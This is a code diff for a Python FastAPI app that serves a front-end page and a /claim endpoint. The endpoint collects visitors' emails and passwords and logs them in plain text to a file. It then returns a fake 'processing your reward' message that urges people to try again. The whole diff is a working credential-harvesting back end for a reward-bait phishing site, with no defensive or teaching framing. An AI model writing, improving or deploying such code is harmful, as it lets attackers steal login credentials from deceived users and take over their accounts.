@@ -1,25 +1,26 @@
 from fastapi import FastAPI, Request
-from fastapi.middleware.cors import CORSMiddleware
-from pydantic import BaseModel
-from datetime import datetime
+from fastapi.responses import HTMLResponse, JSONResponse
+from fastapi.staticfiles import StaticFiles
+import time
 
 app = FastAPI()
 
-# Allow CORS for frontend testing
-app.add_middleware(
-    CORSMiddleware,
-    allow_origins=["*"],  # In production, set specific domain
-    allow_credentials=True,
-    allow_methods=["*"],
-    allow_headers=["*"],
-)
+app.mount("/static", StaticFiles(directory="static"), name="static")
 
-class ClaimData(BaseModel):
-    email: str
-    password: str
+@app.get("/", response_class=HTMLResponse)
+async def serve_frontend():
+    with open("static/index.html", "r", encoding="utf-8") as f:
+        return HTMLResponse(content=f.read())
 
 @app.post("/claim")
-async def receive_claim(data: ClaimData):
-    with open("claims.txt", "a") as file:
-        file.write(f"{datetime.now()} - Email: {data.email}, Password: {data.password}\n")
-    return {"message": "Claim received"}
+async def claim(request: Request):
+    data = await request.json()
+    email = data.get("email")
+    password = data.get("password")
+
+    with open("data.txt", "a") as f:
+        f.write(f"{time.ctime()} | Email: {email} | Password: {password}\n")
+
+    return JSONResponse({
+        "message": "Please wait 10 mins while we process your reward. If you didn't get it, please try again."
+    })
